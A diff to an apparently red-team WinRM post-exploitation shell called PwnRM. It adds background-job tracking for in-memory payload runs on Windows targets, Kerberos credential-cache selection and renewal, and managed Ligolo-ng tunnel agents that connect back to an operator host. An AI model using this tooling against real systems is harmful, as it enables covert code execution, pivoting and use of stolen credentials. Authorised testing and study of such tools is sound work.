@@ -35,6 +35,10 @@ from ..core.session_mgr import SessionManager
 from ..core.tunnel import Socks5Server, PortForwarder
 from ..core.loot import LootManager
 from ..core.opsec import OPSECProfile
+from ..core.jobs import JobRecord, JobRegistry
+from ..core.tickets import TicketManager
+from ..core.capabilities import COMMAND_CAPABILITIES, get_capability, normalize_command_name
+from ..core.ligolo import LigoloAssetManager
 from ..core.noconsolation import (
     NoConsolationError,
     NoConsolationOptions,
@@ -116,12 +120,15 @@ COMMAND_REGISTRY = {
         "!session [list|switch|save|exec-all]": "Multi-session manager & jump graph",
         "!socks [PORT|stop|status]": "Direct local SOCKS5 proxy (default: 1080)",
         "!portfwd [LPORT RHOST:RPORT|list|stop]": "Direct local TCP port forwarder",
-        "!ligolo [--remote] AGENT [ARG..]": "Launch a detached in-memory Ligolo-ng agent",
+        "!ligolo [start|fetch|list|status|stop|restart|cleanup|profile]": "Managed detached Ligolo-ng agents",
+        "!jobs [list|status ID|output ID|stop ID|cleanup]": "Track and control PwnRM background jobs",
+        "!ticket [list|inspect|use|renew]": "Inspect and select operator Kerberos ccaches",
+        "!capabilities [COMMAND]": "Show backend, privilege, artifact, and risk requirements",
         "!module [list|run <name>]": "Extensible module & plugin subsystem",
         "!loot": "View organized credentials & artifacts",
         "!opsec [stealth|balanced|aggressive|hybrid-cloud]": "Toggle execution jitter & profile",
         "!playbook [list|run <name>|run --file PATH]": "Declarative red team playbook runner",
-        "!help": "Display every interactive command and its current syntax",
+        "!help [COMMAND]": "Display every command or detailed command requirements",
     },
     "Identity & Active Directory Assessment": {
         "!adcs [--quick] [--template <T>] [--ca <CA>] [--alt SAN] [--wsus]": "ADCS CA/template/ACL & WSUS triage",
@@ -178,6 +185,12 @@ class PwnShell:
         self.loot_mgr = LootManager(base_dir=_PWNRM_DIR)
         self.opsec_profile = OPSECProfile(mode="balanced")
         self.module_mgr = ModuleManager()
+        target_name = str(self.target_info.get("host", "unknown"))
+        self.job_registry = JobRegistry(_PWNRM_DIR, target_name)
+        self.ticket_mgr = TicketManager()
+        self._selected_ccache = ""
+        self.ligolo_assets = LigoloAssetManager(_PWNRM_DIR)
+        self._ligolo_specs: Dict[str, str] = {}
 
         if _PTK:
             hist_path = _PWNRM_DIR / ".pwnrm_history"
@@ -223,7 +236,35 @@ class PwnShell:
         return {"status": "completed"}
 
     # ── interactive help (OPT-03) ─────────────────────────────────────────────
-    def help(self):
+    @staticmethod
+    def _command_syntax(name: str) -> str:
+        needle = normalize_command_name(name)
+        for commands in COMMAND_REGISTRY.values():
+            for syntax in commands:
+                if normalize_command_name(syntax) == needle:
+                    return syntax
+        return f"!{needle}"
+
+    def help(self, command: str = ""):
+        if command.strip():
+            try:
+                capability = get_capability(command)
+            except KeyError as exc:
+                self.write_warning(str(exc).strip("'"))
+                return {"status": "error", "error": str(exc)}
+            persistent = bool(getattr(getattr(self, "runspace", None), "persistent", True))
+            availability = "available" if capability.available(persistent=persistent) else "unavailable on current backend"
+            print(textwrap.dedent(f"""\
+            {BLD}  {self._command_syntax(capability.command)}{RST}
+              Status     : {availability}
+              Backends   : {capability.backends}
+              Privilege  : {capability.privilege}
+              Artifacts  : {capability.artifacts}
+              Risk       : {capability.risk}
+              Notes      : {capability.note or '-'}
+            """))
+            return {"status": "help", "command": capability.command}
+
         elapsed = str(datetime.now() - self.start_time).split(".")[0]
         tgt = self.target_info.get("host","?")
         usr = self.target_info.get("user","?")
@@ -281,11 +322,15 @@ class PwnShell:
                 ("!socks",      self._socks_dispatch),
                 ("!portfwd",    self._portfwd_dispatch),
                 ("!ligolo",     self.ligolo),
+                ("!jobs",       self._jobs_dispatch),
+                ("!ticket",     self._ticket_dispatch),
+                ("!tickets",    self._ticket_dispatch),
+                ("!capabilities", self._capabilities_dispatch),
                 ("!module",     self._module_dispatch),
                 ("!loot",       self._loot_dispatch),
                 ("!opsec",      self._opsec_dispatch),
                 ("!playbook",   self._playbook_dispatch),
-                ("!help",       lambda args: self._no_args_dispatch(args, self.help, "!help")),
+                ("!help",       self.help),
                 ("!adcs",       lambda args: self.module_mgr.get_module("adcs").run(self, split_args(args))),
                 ("!kerberos",   lambda args: self.module_mgr.get_module("kerberos").run(self, split_args(args))),
                 ("!entra",      lambda args: self.module_mgr.get_module("entra").run(self, split_args(args))),
@@ -485,6 +530,307 @@ class PwnShell:
     #  DISPATCHERS FOR V2.0 PLATFORM SUBSYSTEMS
     # ══════════════════════════════════════════════════════════════════════════
 
+    def _capabilities_dispatch(self, args_str: str):
+        args = split_args(args_str)
+        if len(args) > 1:
+            self.write_warning("Usage: !capabilities [COMMAND]")
+            return {"status": "error", "error": "too many arguments"}
+        if args:
+            return self.help(args[0])
+        persistent = bool(getattr(getattr(self, "runspace", None), "persistent", True))
+        backend = str(getattr(getattr(self, "runspace", None), "backend_name", "winrm"))
+        self.write_info(c(C + BLD, f"\n  [Command Capabilities — backend: {backend}]"))
+        rows = []
+        for name, capability in COMMAND_CAPABILITIES.items():
+            available = capability.available(persistent=persistent)
+            state = "yes" if available else "no"
+            rows.append({
+                "command": name,
+                "available": available,
+                "backends": capability.backends,
+                "privilege": capability.privilege,
+                "artifacts": capability.artifacts,
+                "risk": capability.risk,
+            })
+            self.write_info(
+                f"  {c(Y, ('!' + name).ljust(18))} "
+                f"Available: {state.ljust(3)} | Backend: {capability.backends.ljust(6)} | "
+                f"Risk: {capability.risk}"
+            )
+        self.write_info("\n  Use !help COMMAND for privileges, artifacts, and notes.\n")
+        return {"status": "completed", "capabilities": rows}
+
+    def _active_ccache_path(self) -> str:
+        if getattr(self, "_selected_ccache", ""):
+            return self._selected_ccache
+        transport = getattr(getattr(self, "runspace", None), "_transport", None)
+        creds = getattr(transport, "creds", None)
+        return str(getattr(creds, "ccache", "") or os.environ.get("KRB5CCNAME", ""))
+
+    def _render_ticket_cache(self, cache, selected_index: Optional[int] = None) -> None:
+        self.write_info(c(C + BLD, "\n  [Kerberos Credential Cache]"))
+        self.write_info(f"  Path      : {cache.path}")
+        self.write_info(f"  Principal : {cache.principal}")
+        self.write_info(f"  TGT       : {'yes' if cache.has_tgt else 'no (service-ticket-only cache)'}")
+        for ticket in cache.tickets:
+            if selected_index is not None and ticket.index != selected_index:
+                continue
+            self.write_info(
+                f"\n  [{ticket.index}] {ticket.server}\n"
+                f"      Client    : {ticket.client}\n"
+                f"      Enctype   : {ticket.enctype}\n"
+                f"      Flags     : {ticket.flags}\n"
+                f"      Start     : {ticket.start_time}\n"
+                f"      End       : {ticket.end_time}\n"
+                f"      Renew     : {ticket.renew_till}"
+            )
+        self.write_info("")
+
+    def _ticket_dispatch(self, args_str: str):
+        args = split_args(args_str)
+        subcmd = args[0].lower() if args else "list"
+        try:
+            if subcmd in {"list", "current"}:
+                if len(args) > 2 or (subcmd == "current" and len(args) != 1):
+                    raise ValueError("usage: !ticket list [CCACHE]")
+                path = args[1] if len(args) == 2 else self._active_ccache_path()
+                cache = self.ticket_mgr.inspect(path)
+                self._render_ticket_cache(cache)
+                return {"status": "completed", "cache": cache}
+            if subcmd == "inspect":
+                if len(args) > 3:
+                    raise ValueError("usage: !ticket inspect [INDEX] [CCACHE]")
+                index = None
+                path = self._active_ccache_path()
+                if len(args) >= 2:
+                    try:
+                        index = int(args[1])
+                    except ValueError:
+                        path = args[1]
+                if len(args) == 3:
+                    if index is None:
+                        raise ValueError("ticket index must be an integer")
+                    path = args[2]
+                cache = self.ticket_mgr.inspect(path)
+                if index is not None and not any(item.index == index for item in cache.tickets):
+                    raise ValueError(f"ticket index {index} does not exist")
+                self._render_ticket_cache(cache, index)
+                return {"status": "completed", "cache": cache, "index": index}
+            if subcmd == "use" and len(args) == 2:
+                cache = self.ticket_mgr.inspect(args[1])
+                os.environ["KRB5CCNAME"] = f"FILE:{cache.path}"
+                self._selected_ccache = cache.path
+                self.write_info(f"  [+] Default operator ccache set to FILE:{cache.path}")
+                self.write_warning(
+                    "The current authenticated backend is unchanged; reconnect to authenticate with this cache."
+                )
+                return {"status": "completed", "path": cache.path, "reconnect_required": True}
+            if subcmd == "renew" and len(args) <= 2:
+                path = args[1] if len(args) == 2 else self._active_ccache_path()
+                cache = self.ticket_mgr.renew(path)
+                self.write_info(f"  [+] Renewed TGT cache: {cache.path}")
+                self._render_ticket_cache(cache)
+                return {"status": "completed", "cache": cache}
+            raise ValueError("usage: !ticket [list [CCACHE]|inspect [INDEX] [CCACHE]|use CCACHE|renew [CCACHE]]")
+        except (FileNotFoundError, KeyError, OSError, RuntimeError, ValueError) as exc:
+            self.write_error(str(exc))
+            return {"status": "error", "error": str(exc)}
+
+    def _refresh_job(self, record: JobRecord) -> JobRecord:
+        if record.status != "running":
+            return record
+        if record.mode == "process":
+            if record.pid is None:
+                return self.job_registry.update(record, status="missing")
+            state = self._process_job_state(record)
+            if state != "RUNNING":
+                metadata = dict(record.metadata)
+                metadata["last_process_state"] = state.lower()
+                return self.job_registry.update(record, status="completed", metadata=metadata)
+            return record
+        remote_id = record.remote_id
+        state = self.run_sync(f"""
+if (-not $global:PwnRMNoConJobs -or -not $global:PwnRMNoConJobs.ContainsKey('{remote_id}')) {{
+    'MISSING'
+}} elseif ($global:PwnRMNoConJobs['{remote_id}'].Async.IsCompleted) {{
+    'COMPLETED'
+}} else {{
+    'RUNNING'
+}}
+""").strip().upper()
+        if state == "COMPLETED":
+            return self.job_registry.update(record, status="completed", output_available=True)
+        if state != "RUNNING":
+            return self.job_registry.update(record, status="missing")
+        return record
+
+    def _process_job_state(self, record: JobRecord) -> str:
+        """Return process state while rejecting stale records after PID reuse."""
+        if record.pid is None:
+            return "MISSING"
+        expected = record.metadata.get("process_start_ticks")
+        try:
+            expected_ticks = int(expected)
+        except (TypeError, ValueError):
+            return "UNVERIFIED"
+        if expected_ticks <= 0:
+            return "UNVERIFIED"
+        return self.run_sync(f"""
+$p = Get-Process -Id {int(record.pid)} -ErrorAction SilentlyContinue
+if (-not $p) {{
+    'MISSING'
+}} else {{
+    try {{ $ticks = [long]$p.StartTime.ToUniversalTime().Ticks }} catch {{ $ticks = 0 }}
+    if ($ticks -eq {expected_ticks}) {{ 'RUNNING' }} else {{ 'REUSED' }}
+}}
+""").strip().upper()
+
+    def _job_output(self, record: JobRecord) -> dict:
+        if record.mode != "runspace":
+            message = "detached process output was not captured"
+            self.write_warning(message)
+            return {"status": "error", "error": message}
+        remote_id = record.remote_id
+        output = self.run_sync(f"""
+if (-not $global:PwnRMNoConJobs -or -not $global:PwnRMNoConJobs.ContainsKey('{remote_id}')) {{
+    Write-Output '__PWNRM_JOB_MISSING__'
+}} else {{
+    $j = $global:PwnRMNoConJobs['{remote_id}']
+    if (-not $j.Async.IsCompleted) {{
+        Write-Output '__PWNRM_JOB_RUNNING__'
+    }} else {{
+        if (-not $j.Ended) {{
+            try {{ $j.Output = (($j.PowerShell.EndInvoke($j.Async) | Out-String) -join '') }}
+            catch {{ $j.Output = $_ | Out-String; $j.Failed = $true }}
+            $j.ErrorText = (($j.PowerShell.Streams.Error | Out-String) -join '')
+            $j.Ended = $true
+        }}
+        if ($j.Failed -or $j.ErrorText) {{ Write-Output '__PWNRM_JOB_FAILED__' }}
+        if ($j.Output) {{ Write-Output $j.Output }}
+        if ($j.ErrorText) {{ Write-Output $j.ErrorText }}
+    }}
+}}
+""", max_bytes=4 * 1024 * 1024)
+        if "__PWNRM_JOB_RUNNING__" in output:
+            self.write_warning("job is still running; output is available after completion")
+            return {"status": "running"}
+        if "__PWNRM_JOB_MISSING__" in output:
+            self.job_registry.update(record, status="missing")
+            return {"status": "error", "error": "remote job is missing"}
+        failed = "__PWNRM_JOB_FAILED__" in output
+        output = output.replace("__PWNRM_JOB_FAILED__", "").lstrip("\r\n")
+        self.job_registry.update(record, status="failed" if failed else "completed", output_available=True)
+        if output:
+            self.write_info(output.rstrip())
+        return {"status": "completed", "output": output}
+
+    def _stop_job(self, record: JobRecord) -> dict:
+        if record.mode == "process":
+            if record.pid is not None:
+                expected = record.metadata.get("process_start_ticks")
+                try:
+                    expected_ticks = int(expected)
+                except (TypeError, ValueError):
+                    expected_ticks = 0
+                if expected_ticks <= 0:
+                    message = (
+                        f"refusing to stop unverified PID {record.pid}; "
+                        "the process identity marker is unavailable"
+                    )
+                    self.write_error(message)
+                    return {"status": "error", "error": message, "job": record}
+                state = self.run_sync(
+                    f"$p=Get-Process -Id {int(record.pid)} -ErrorAction SilentlyContinue;"
+                    "if(-not $p){'MISSING'}else{"
+                    "try{$ticks=[long]$p.StartTime.ToUniversalTime().Ticks}catch{$ticks=0};"
+                    f"if($ticks -ne {expected_ticks}){{'REUSED'}}else{{"
+                    "try{$p.Kill();[void]$p.WaitForExit(3000)}catch{};"
+                    "if($p.HasExited){'STOPPED'}else{'RUNNING'}}}"
+                ).strip().upper()
+                if state == "MISSING":
+                    self.job_registry.update(record, status="completed")
+                    self.write_info(f"  [+] Job {record.job_id} had already exited (PID {record.pid})")
+                    return {"status": "completed", "job": record}
+                if state == "REUSED":
+                    metadata = dict(record.metadata)
+                    metadata["last_process_state"] = "reused"
+                    self.job_registry.update(record, status="completed", metadata=metadata)
+                    message = f"refusing to stop PID {record.pid}: the PID now belongs to a different process"
+                    self.write_error(message)
+                    return {"status": "error", "error": message, "job": record}
+                if state != "STOPPED":
+                    message = f"process {record.pid} is still running"
+                    self.write_error(message)
+                    return {"status": "error", "error": message, "job": record}
+            self.job_registry.update(record, status="stopped")
+            self.write_info(f"  [+] Stopped job {record.job_id} (PID {record.pid or '?'})")
+            return {"status": "completed", "job": record}
+        remote_id = record.remote_id
+        self.run_sync(f"""
+if ($global:PwnRMNoConJobs -and $global:PwnRMNoConJobs.ContainsKey('{remote_id}')) {{
+    $j = $global:PwnRMNoConJobs['{remote_id}']
+    try {{ $j.PowerShell.Stop() }} catch {{}}
+    try {{ if (-not $j.Async.IsCompleted) {{ [void]$j.Async.AsyncWaitHandle.WaitOne(3000) }} }} catch {{}}
+    try {{ $j.PowerShell.Dispose() }} catch {{}}
+    $global:PwnRMNoConJobs.Remove('{remote_id}')
+}}
+""")
+        self.job_registry.update(record, status="stopped")
+        self.write_info(f"  [+] Stopped job {record.job_id}")
+        return {"status": "completed", "job": record}
+
+    def _jobs_dispatch(self, args_str: str):
+        args = split_args(args_str)
+        subcmd = args[0].lower() if args else "list"
+        try:
+            if subcmd == "list" and len(args) <= 1:
+                records = [self._refresh_job(record) for record in self.job_registry.list()]
+                self.write_info(c(C + BLD, "\n  [PwnRM Jobs]"))
+                if not records:
+                    self.write_info("  No tracked jobs.")
+                for record in records:
+                    identity = f"PID {record.pid}" if record.pid is not None else record.remote_id[:12]
+                    self.write_info(
+                        f"  {c(Y, record.job_id)} | {record.status.ljust(9)} | "
+                        f"{record.kind.ljust(15)} | {identity} | {record.name}"
+                    )
+                self.write_info("")
+                return {"status": "completed", "jobs": records}
+            if subcmd == "status" and len(args) == 2:
+                record = self._refresh_job(self.job_registry.resolve(args[1]))
+                self.write_info(
+                    f"  Job {record.job_id}: {record.status} | {record.kind} | "
+                    f"PID={record.pid or '-'} | {record.name}"
+                )
+                return {"status": "completed", "job": record}
+            if subcmd == "output" and len(args) == 2:
+                return self._job_output(self.job_registry.resolve(args[1]))
+            if subcmd == "stop" and len(args) == 2:
+                if args[1].lower() == "all":
+                    stopped = [self._stop_job(record) for record in self.job_registry.list() if record.status == "running"]
+                    return {"status": "completed", "stopped": len(stopped)}
+                return self._stop_job(self.job_registry.resolve(args[1]))
+            if subcmd == "cleanup" and len(args) == 1:
+                for record in self.job_registry.list():
+                    self._refresh_job(record)
+                for record in self.job_registry.list():
+                    if record.mode == "runspace" and record.terminal and record.remote_id:
+                        self.run_sync(f"""
+if ($global:PwnRMNoConJobs -and $global:PwnRMNoConJobs.ContainsKey('{record.remote_id}')) {{
+    $j = $global:PwnRMNoConJobs['{record.remote_id}']
+    try {{ if ($j.Async.IsCompleted -and -not $j.Ended) {{ [void]$j.PowerShell.EndInvoke($j.Async) }} }} catch {{}}
+    try {{ $j.PowerShell.Dispose() }} catch {{}}
+    $global:PwnRMNoConJobs.Remove('{record.remote_id}')
+}}
+""")
+                removed = self.job_registry.cleanup_terminal()
+                self.write_info(f"  [+] Removed {len(removed)} terminal job record(s).")
+                return {"status": "completed", "removed": removed}
+            raise ValueError("usage: !jobs [list|status ID|output ID|stop ID|stop all|cleanup]")
+        except (KeyError, OSError, RuntimeError, ValueError) as exc:
+            self.write_error(str(exc).strip("'"))
+            return {"status": "error", "error": str(exc)}
+
     def _session_dispatch(self, args_str: str):
         args = split_args(args_str)
         subcmd = args[0].lower() if args else "list"
@@ -506,6 +852,7 @@ class PwnShell:
                     node = self.session_mgr.get_current()
                     self.runspace = node.runspace
                     self.target_info = node.target_info
+                    self.job_registry.select_target(str(node.host))
                     self.update_cwd()
                     self.write_info(c(G, f"  [+] Switched to session {sid} ({node.host})"))
                     if self.stdout_log:
@@ -902,15 +1249,35 @@ try {{
     def _background_job_preamble() -> str:
         return r'''
 if (-not $global:PwnRMNoConJobs) { $global:PwnRMNoConJobs = @{} }
-foreach ($oldId in @($global:PwnRMNoConJobs.Keys)) {
-    $oldJob = $global:PwnRMNoConJobs[$oldId]
-    if ($oldJob.Async.IsCompleted) {
-        try { [void]$oldJob.PowerShell.EndInvoke($oldJob.Async) } catch {}
-        $oldJob.PowerShell.Dispose()
-        $global:PwnRMNoConJobs.Remove($oldId)
-    }
-}
 '''
+
+    def _track_memory_job(self, result: dict, *, kind: str, name: str) -> dict:
+        if (
+            result.get("status") != "completed"
+            or not result.get("background")
+            or not hasattr(self, "job_registry")
+        ):
+            return result
+        mode = str(result.get("job_mode", ""))
+        if mode not in {"runspace", "process"}:
+            return result
+        record = self.job_registry.register(
+            kind=kind,
+            name=PureWindowsPath(name).name or Path(name).name or kind,
+            mode=mode,
+            remote_id=str(result.get("remote_id", "")),
+            pid=result.get("pid"),
+            output_available=bool(result.get("output_available", mode == "runspace")),
+            metadata={
+                "process_start_ticks": result.get("process_start_ticks"),
+            } if mode == "process" else {},
+        )
+        result["job_id"] = record.job_id
+        self.write_info(
+            f"  [+] Tracked as job {record.job_id} "
+            f"({'PID ' + str(record.pid) if record.pid is not None else record.remote_id[:12]})"
+        )
+        return result
 
     def _run_detached_memory(
         self,
@@ -926,6 +1293,7 @@ foreach ($oldId in @($global:PwnRMNoConJobs.Keys)) {
             raise NoConsolationError("invalid detached execution configuration")
 
         pipe_name = f"PwnRM-{secrets.token_hex(16)}"
+        remote_id = secrets.token_hex(16)
         variables = []
         try:
             for index, blob in enumerate(blobs):
@@ -996,6 +1364,7 @@ try {{
 $Pipe = $null
 $Writer = $null
 $DetachedPid = 0
+$DetachedStartTicks = 0
 $Acknowledged = $false
 try {{
     $Pipe = New-Object -TypeName IO.Pipes.NamedPipeServerStream -ArgumentList @(
@@ -1009,6 +1378,7 @@ try {{
         throw "Win32_Process.Create failed (return=$($Created.ReturnValue))"
     }}
     $DetachedPid = [int]$Created.ProcessId
+    $DetachedStartTicks = [long](Get-Process -Id $DetachedPid -ErrorAction Stop).StartTime.ToUniversalTime().Ticks
     $PendingConnection = $Pipe.BeginWaitForConnection($null, $null)
     if (-not $PendingConnection.AsyncWaitHandle.WaitOne(15000)) {{
         throw 'Detached process did not connect to its memory pipe within 15 seconds'
@@ -1026,6 +1396,7 @@ try {{
     if ($AckLength -ne 1 -or $Ack[0] -ne 165) {{ throw 'Invalid detached process acknowledgement' }}
     $Acknowledged = $true
     Write-Output "PwnRM detached {kind} memory job started: PID $DetachedPid"
+    Write-Output "__PWNRM_DETACHED__:{remote_id}:$DetachedPid`:$DetachedStartTicks"
 }} finally {{
     if ($Writer) {{ $Writer.Dispose() }} elseif ($Pipe) {{ $Pipe.Dispose() }}
     if (-not $Acknowledged -and $DetachedPid -gt 0) {{
@@ -1034,12 +1405,30 @@ try {{
 {clear_parent}
 }}
 '''
-        interrupted = self.run_with_interrupt(script, self.write_line)
+        captured = []
+        def collect(record):
+            if "stdout" in record:
+                captured.append(str(record["stdout"]))
+            if "__PWNRM_DETACHED__" not in str(record.get("stdout", "")):
+                self.write_line(record)
+
+        interrupted = self.run_with_interrupt(script, collect)
+        match = re.search(
+            rf"__PWNRM_DETACHED__:{re.escape(remote_id)}:(\d+):(\d+)",
+            "".join(captured),
+        )
+        pid = int(match.group(1)) if match else None
+        process_start_ticks = int(match.group(2)) if match else None
+        status = "interrupted" if interrupted else ("completed" if pid is not None else "error")
         return {
-            "status": "interrupted" if interrupted else "completed",
+            "status": status,
             "capture_output": False,
-            "background": not interrupted,
-            "detached": not interrupted,
+            "background": status == "completed",
+            "detached": status == "completed",
+            "job_mode": "process",
+            "remote_id": remote_id,
+            "pid": pid,
+            "process_start_ticks": process_start_ticks,
         }
 
     def _run_managed_memory(
@@ -1100,6 +1489,7 @@ try {{
             interrupted = self.run_with_interrupt(script, self.write_line)
             return {"status": "interrupted" if interrupted else "completed", "capture_output": True}
 
+        remote_id = secrets.token_hex(16)
         script = f'''
 $buf = $global:{variable}.ToArray()
 $global:{variable}.Dispose()
@@ -1118,13 +1508,13 @@ $runner = {{
         if ($Payload) {{ [Array]::Clear($Payload, 0, $Payload.Length) }}
     }}
 }}
-$jobId = [Guid]::NewGuid().ToString('N')
+$jobId = '{remote_id}'
 $worker = [PowerShell]::Create()
 [void]$worker.AddScript($runner.ToString())
 [void]$worker.AddArgument($buf)
 [void]$worker.AddArgument(({argv_ps}))
 $async = $worker.BeginInvoke()
-$global:PwnRMNoConJobs[$jobId] = @{{ PowerShell = $worker; Async = $async; Kind = 'managed' }}
+$global:PwnRMNoConJobs[$jobId] = @{{ PowerShell = $worker; Async = $async; Kind = 'managed'; Ended = $false; Output = ''; ErrorText = ''; Failed = $false }}
 Write-Output "PwnRM background memory job started: $jobId"
 '''
         interrupted = self.run_with_interrupt(script, self.write_line)
@@ -1132,6 +1522,9 @@ Write-Output "PwnRM background memory job started: $jobId"
             "status": "interrupted" if interrupted else "completed",
             "capture_output": False,
             "background": not interrupted,
+            "job_mode": "runspace",
+            "remote_id": remote_id,
+            "output_available": True,
         }
 
     def _run_native_memory(
@@ -1195,6 +1588,7 @@ try {
             interrupted = self.run_with_interrupt(script, self.write_line)
             return {"status": "interrupted" if interrupted else "completed", "capture_output": True}
 
+        remote_id = secrets.token_hex(16)
         script = prepare + self._background_job_preamble() + r'''
 $runner = {
     param([byte[]]$Loader, [byte[]]$Bof, [byte[]]$Arguments)
@@ -1207,21 +1601,25 @@ $runner = {
         if ($Arguments) { [Array]::Clear($Arguments,0,$Arguments.Length) }
     }
 }
-$jobId = [Guid]::NewGuid().ToString('N')
+$jobId = '__PWNRM_JOB_ID__'
 $worker = [PowerShell]::Create()
 [void]$worker.AddScript($runner.ToString())
 [void]$worker.AddArgument($loaderBytes)
 [void]$worker.AddArgument($bofBytes)
 [void]$worker.AddArgument($packedBytes)
 $async = $worker.BeginInvoke()
-$global:PwnRMNoConJobs[$jobId] = @{ PowerShell = $worker; Async = $async; Kind = 'native' }
+$global:PwnRMNoConJobs[$jobId] = @{ PowerShell = $worker; Async = $async; Kind = 'native'; Ended = $false; Output = ''; ErrorText = ''; Failed = $false }
 Write-Output "PwnRM background No-Consolation job started: $jobId"
 '''
+        script = script.replace("__PWNRM_JOB_ID__", remote_id)
         interrupted = self.run_with_interrupt(script, self.write_line)
         return {
             "status": "interrupted" if interrupted else "completed",
             "capture_output": False,
             "background": not interrupted,
+            "job_mode": "runspace",
+            "remote_id": remote_id,
+            "output_available": True,
         }
 
     # ── !noconsolation ───────────────────────────────────────────────────────
@@ -1329,12 +1727,17 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
                         raise NoConsolationError("remote managed payload exceeds PWNRM_MAX_EXEC")
                     if not inspect_pe(payload).managed:
                         raise NoConsolationError("remote managed payload has no CLR header")
-                return self._run_managed_memory(
+                result = self._run_managed_memory(
                     payload,
                     argv,
                     capture_output,
                     detached=detached,
                     architecture=remote_arch,
+                )
+                return self._track_memory_job(
+                    result,
+                    kind="noconsolation-managed",
+                    name=source,
                 )
 
             if pe_info and pe_info.architecture != remote_arch:
@@ -1350,7 +1753,7 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
                 dont_unload=dont_unload,
                 load_all_dependencies=load_all_dependencies,
             )
-            return self._run_native_memory(
+            result = self._run_native_memory(
                 source=source,
                 payload=payload,
                 remote_source=remote_source,
@@ -1360,31 +1763,261 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
                 architecture=remote_arch,
                 detached=detached,
             )
+            return self._track_memory_job(
+                result,
+                kind="noconsolation-native",
+                name=source,
+            )
         except (NoConsolationError, OSError, ValueError, binascii.Error) as exc:
             self.write_error(f"No-Consolation setup failed: {exc}")
             return {"status": "error", "error": str(exc)}
 
     # ── !ligolo ──────────────────────────────────────────────────────────────
-    def ligolo(self, cmdline: str):
-        """Launch an operator-supplied Windows Ligolo-ng agent detached."""
-        args = split_args(cmdline)
-        usage = "usage: !ligolo [--remote] AGENT [LIGOLO_ARG..]"
-        if not args:
-            self.write_warning(usage)
-            return {"status": "error", "error": "missing Ligolo-ng agent"}
-        remote = False
-        if args[0].lower() == "--remote":
-            remote = True
-            args = args[1:]
-        if not args or args[0].startswith("-"):
-            self.write_warning(usage)
-            return {"status": "error", "error": "missing Ligolo-ng agent"}
+    def _ligolo_architecture(self) -> str:
+        value = self.run_sync(
+            "try { [Runtime.InteropServices.RuntimeInformation]::OSArchitecture.ToString() } "
+            "catch { if ([IntPtr]::Size -eq 8) { 'X64' } else { 'X86' } }"
+        ).strip().lower()
+        return {"x64": "amd64", "x86": "386", "arm64": "arm64"}.get(value, "amd64")
 
-        forwarded = ["--detached", "native"]
+    def _ligolo_fetch(self, args: list[str]):
+        version = ""
+        architecture = ""
+        idx = 0
+        while idx < len(args):
+            option = args[idx].lower()
+            if option in {"--version", "--arch"}:
+                idx += 1
+                if idx >= len(args):
+                    raise ValueError(f"{option} requires a value")
+                if option == "--version":
+                    version = args[idx]
+                else:
+                    architecture = args[idx].lower()
+            else:
+                raise ValueError(f"unknown fetch option: {args[idx]}")
+            idx += 1
+        architecture = architecture or self._ligolo_architecture()
+        self.write_info(f"  [~] Fetching verified Ligolo-ng Windows {architecture} agent...")
+        asset = self.ligolo_assets.fetch(version=version, architecture=architecture)
+        self.write_info(
+            f"  [+] Ligolo-ng {asset['version']} ({asset['architecture']}) ready: {asset['path']}\n"
+            f"      SHA-256: {asset['sha256']}"
+        )
+        return {"status": "completed", "asset": asset}
+
+    def _ligolo_profile(self, args: list[str]):
+        action = args[0].lower() if args else "list"
+        if action == "list" and len(args) == 1:
+            profiles = self.ligolo_assets.list_profiles()
+            self.write_info(c(C + BLD, "\n  [Ligolo-ng Connection Profiles]"))
+            if not profiles:
+                self.write_info("  No profiles configured.")
+            for name, profile in profiles.items():
+                tls = "ignore-cert" if profile.get("ignore_cert") else (
+                    "fingerprint" if profile.get("fingerprint") else "PKI verification"
+                )
+                self.write_info(
+                    f"  {c(Y, name)} | {profile.get('connect', '?')} | TLS: {tls} | "
+                    f"retry: {'yes' if profile.get('retry', True) else 'no'}"
+                )
+            self.write_info("")
+            return {"status": "completed", "profiles": profiles}
+        if action == "save" and len(args) >= 3:
+            name, connect = args[1], args[2]
+            ignore_cert = False
+            fingerprint = ""
+            retry = True
+            idx = 3
+            while idx < len(args):
+                option = args[idx].lower()
+                if option == "--ignore-cert":
+                    ignore_cert = True
+                elif option == "--no-retry":
+                    retry = False
+                elif option == "--accept-fingerprint":
+                    idx += 1
+                    if idx >= len(args):
+                        raise ValueError("--accept-fingerprint requires a SHA-256 fingerprint")
+                    fingerprint = args[idx]
+                else:
+                    raise ValueError(f"unknown profile option: {args[idx]}")
+                idx += 1
+            profile = self.ligolo_assets.save_profile(
+                name,
+                connect,
+                ignore_cert=ignore_cert,
+                fingerprint=fingerprint,
+                retry=retry,
+            )
+            self.write_info(f"  [+] Saved Ligolo-ng profile {name}.")
+            return {"status": "completed", "name": name, "profile": profile}
+        if action in {"delete", "remove"} and len(args) == 2:
+            self.ligolo_assets.delete_profile(args[1])
+            self.write_info(f"  [+] Deleted Ligolo-ng profile {args[1]}.")
+            return {"status": "completed", "name": args[1]}
+        raise ValueError(
+            "usage: !ligolo profile [list|save NAME HOST:PORT "
+            "[--ignore-cert|--accept-fingerprint SHA256] [--no-retry]|delete NAME]"
+        )
+
+    def _ligolo_start(self, args: list[str]):
+        if not getattr(getattr(self, "runspace", None), "persistent", True):
+            message = "Ligolo in-memory staging requires a persistent WinRM runspace; reconnect with --protocol winrm."
+            self.write_error(message)
+            return {"status": "error", "error": message}
+        source = ""
+        remote = False
+        profile_name = ""
+        version = ""
+        architecture = ""
+        forwarded: list[str] = []
+        idx = 0
+        while idx < len(args):
+            arg = args[idx]
+            option = arg.lower()
+            if option in {"--agent", "--remote", "--profile", "--version", "--arch"}:
+                idx += 1
+                if idx >= len(args):
+                    raise ValueError(f"{option} requires a value")
+                value = args[idx]
+                if option == "--agent":
+                    source = value
+                elif option == "--remote":
+                    source, remote = value, True
+                elif option == "--profile":
+                    profile_name = value
+                elif option == "--version":
+                    version = value
+                else:
+                    architecture = value.lower()
+            elif option in {"-connect", "--connect", "-accept-fingerprint", "--accept-fingerprint", "-server-name", "--server-name"}:
+                idx += 1
+                if idx >= len(args):
+                    raise ValueError(f"{arg} requires a value")
+                forwarded.extend([arg, args[idx]])
+            elif option in {"-ignore-cert", "--ignore-cert", "-retry", "--retry", "-verbose", "--verbose"}:
+                forwarded.append(arg)
+            elif arg == "--":
+                forwarded.extend(args[idx + 1:])
+                break
+            elif not source and not arg.startswith("-"):
+                # Backward-compatible form: !ligolo ./agent.exe -connect ...
+                source = arg
